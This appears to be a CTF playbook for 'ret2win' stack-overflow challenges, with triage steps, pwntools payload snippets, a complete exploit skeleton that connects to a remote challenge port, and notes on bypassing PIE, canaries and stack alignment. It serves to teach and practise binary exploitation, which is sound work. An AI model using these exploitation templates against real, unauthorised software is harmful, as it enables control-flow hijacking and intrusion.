# Pwn ret2win

## When to suspect this

- Binary contains function named `win`, `print_flag`, `get_shell`, `debug`, `secret`.
- `checksec` shows no canary or overflow avoids canary.
- Source has stack overflow with fixed-size buffer.
- Challenge is beginner pwn with local binary and remote `nc`.

## Fast triage checklist

- Run `file` and `checksec`.
- Find win-like symbols.
- Crash with cyclic pattern.
- Calculate offset.
- Check calling convention and required arguments.
- Add stack alignment `ret` on amd64 if needed.
- Test locally, then remote.

## Manual confirmation

```bash
checksec --file=./chall
nm -an ./chall | rg ' win|flag|secret|shell'
python3 - <<'PY'
from pwn import *
print(cyclic(200))
PY
gdb -q ./chall
```

Positive signal:

- Saved RIP/EIP overwritten by cyclic value.
- Win function has fixed address or PIE base known.
- Payload reaches win locally.

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| [scripts/pwn/ret2win_template.py](../scripts/pwn/ret2win_template.py) | Standard exploit | `python3 scripts/pwn/ret2win_template.py LOCAL` | Win output |
| pwntools | Offset/payload | `cyclic`, `ELF`, `flat` | Controlled RIP |
| checksec | Mitigation strategy | `checksec --file=chall` | No canary/PIE status |
| ROPgadget | Alignment/argument gadgets | `ROPgadget --binary chall | rg 'pop rdi|ret'` | Gadget addresses |

## Payload starter pack

amd64 no-arg:

```python
payload = flat(b"A"*offset, ret, elf.sym["win"])
```

amd64 one arg:

```python
payload = flat(b"A"*offset, pop_rdi, 0xdeadbeef, ret, elf.sym["win"])
```

i386:

```python
payload = flat(b"A"*offset, elf.sym["win"], 0x0, arg1, arg2)
```

## Exploit skeleton

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall")
HOST, PORT = "HOST", 1337

io = remote(HOST, PORT) if args.REMOTE else process(elf.path)
offset = 72
rop = ROP(elf)
ret = rop.find_gadget(["ret"])[0]

payload = flat(b"A"*offset, ret, elf.sym["win"])
io.sendlineafter(b"> ", payload)
io.interactive()
```

## Escalation path

- If win requires args, set registers/stack.
- If PIE enabled, leak binary base or use partial overwrite.
- If canary present, leak/bruteforce canary or use non-stack bug.
- If win prints flag path but not flag, call function that reads file.

## Common bypasses

- Add `ret` for 16-byte stack alignment.
- Use `pop rdi; ret` for first argument.
- Return to `main` for second stage.
- Partial return address overwrite when same page and PIE.
- Use hidden gadgets in `__libc_csu_init`.

## Rabbit holes

- Building ret2libc when win exists.
- Forgetting newline/input delimiter.
- Misreading cyclic offset due to endian.
- Ignoring stack alignment crash at `movaps`.

## Final solve checklist

- Offset is exact.
- Win address and required args are correct.
- Local exploit works from clean process.
- Remote exploit uses correct host/port and receives flag.

